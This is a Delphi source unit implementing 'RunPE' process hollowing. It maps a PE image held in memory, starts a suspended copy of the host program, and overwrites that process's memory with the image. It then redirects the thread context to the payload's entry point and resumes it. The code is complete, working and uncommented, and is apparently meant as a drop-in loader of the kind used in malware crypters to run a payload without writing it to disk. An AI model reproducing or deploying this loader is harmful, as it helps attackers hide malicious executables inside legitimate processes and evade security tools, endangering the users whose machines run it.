unit uExecFromMem;

interface

{$IMAGEBASE $10000000}

uses
  SysUtils, Windows;

type
  TSections = array [0..0] of TImageSectionHeader;

function CreateProcessMemory(Memory: Pointer; Parameters: WideString; nShow: Integer): THandle;

implementation

//GetAlignedSize
function GetAlignedSize(Size: DWORD; Alignment: DWORD): DWORD;
begin
  if ((Size mod Alignment) = 0) then Result := Size else Result := ((Size div Alignment) + 1) * Alignment;
end;
//GetAlignedSize


//ImageSize
function ImageSize(Image: Pointer): DWORD;
var
  Alignment: DWORD;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: DWORD;
begin
  ImageNtHeaders := Pointer(DWORD(DWORD(Image)) + DWORD(PImageDosHeader(Image)._lfanew));
  Alignment := ImageNtHeaders.OptionalHeader.SectionAlignment;

  if ((ImageNtHeaders.OptionalHeader.SizeOfHeaders mod Alignment) = 0)
    then Result := ImageNtHeaders.OptionalHeader.SizeOfHeaders
    else Result := ((ImageNtHeaders.OptionalHeader.SizeOfHeaders div Alignment) + 1) * Alignment;

  PSections := Pointer(PChar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do begin
    if PSections[SectionLoop].Misc.VirtualSize <> 0 then
      if ((PSections[SectionLoop].Misc.VirtualSize mod Alignment) = 0) then
        Result := Result + PSections[SectionLoop].Misc.VirtualSize else
        Result := Result + (((PSections[SectionLoop].Misc.VirtualSize div Alignment) + 1) * Alignment);
  end;
end;
//ImageSize


//CreateProcessMemory
function CreateProcessMemory(Memory: Pointer; Parameters: WideString; nShow: Integer): THandle;
var
  BaseAddress, Bytes, HeaderSize: DWORD;
  InjectSize, SectionLoop, SectionSize: DWORD;
  FileData, InjectMemory: Pointer;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  Context: TContext;
  StartUpInfo: TStartUpInfo;
  ProcInfo: TProcessInformation;
begin
  ImageNtHeaders := Pointer(DWORD(DWORD(Memory)) + DWORD(PImageDosHeader(Memory)._lfanew));
  InjectSize := ImageSize(Memory);
  GetMem(InjectMemory, InjectSize);

  try
    FileData := InjectMemory;
    HeaderSize := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
    PSections := Pointer(PChar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

    for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do begin
      if PSections[SectionLoop].PointerToRawData < HeaderSize then HeaderSize := PSections[SectionLoop].PointerToRawData;
    end;

    CopyMemory(FileData, Memory, HeaderSize);
    FileData := Pointer(DWORD(FileData) + GetAlignedSize(ImageNtHeaders.OptionalHeader.SizeOfHeaders, ImageNtHeaders.OptionalHeader.SectionAlignment));

    for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do begin
      if PSections[SectionLoop].SizeOfRawData > 0 then begin
          SectionSize := PSections[SectionLoop].SizeOfRawData;
          if SectionSize > PSections[SectionLoop].Misc.VirtualSize then SectionSize := PSections[SectionLoop].Misc.VirtualSize;
          CopyMemory(FileData, Pointer(DWORD(Memory) + PSections[SectionLoop].PointerToRawData), SectionSize);
          FileData := Pointer(DWORD(FileData) + GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
        end else
          if PSections[SectionLoop].Misc.VirtualSize <> 0 then FileData := Pointer(DWORD(FileData) + GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
    end;

    ZeroMemory(@StartUpInfo, SizeOf(StartupInfo));
    StartUpInfo.cb := SizeOf(TStartupInfo);
    StartUpInfo.wShowWindow := nShow;
    StartUpInfo.dwFlags := STARTF_USESHOWWINDOW;
    CreateProcessW(nil, PWideChar(ParamStr(0) + ' ' + Parameters), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartUpInfo, ProcInfo);

    ZeroMemory(@Context, SizeOf(TContext));
    Context.ContextFlags := CONTEXT_FULL;
    GetThreadContext(ProcInfo.hThread, Context);
    ReadProcessMemory(ProcInfo.hProcess, Pointer(Context.Ebx + 8), @BaseAddress, 4, Bytes);
    VirtualAllocEx(ProcInfo.hProcess, Pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(ProcInfo.hProcess, Pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectMemory, InjectSize, Bytes);
    WriteProcessMemory(ProcInfo.hProcess, Pointer(Context.Ebx + 8), @ImageNtHeaders.OptionalHeader.ImageBase, 4, Bytes);
    Context.Eax := ImageNtHeaders.OptionalHeader.ImageBase + ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(ProcInfo.hThread, Context);

    ResumeThread(ProcInfo.hThread);
    Result := ProcInfo.hProcess;
  finally
    FreeMemory(InjectMemory);
  end;
end;
//CreateProcessMemory

end.
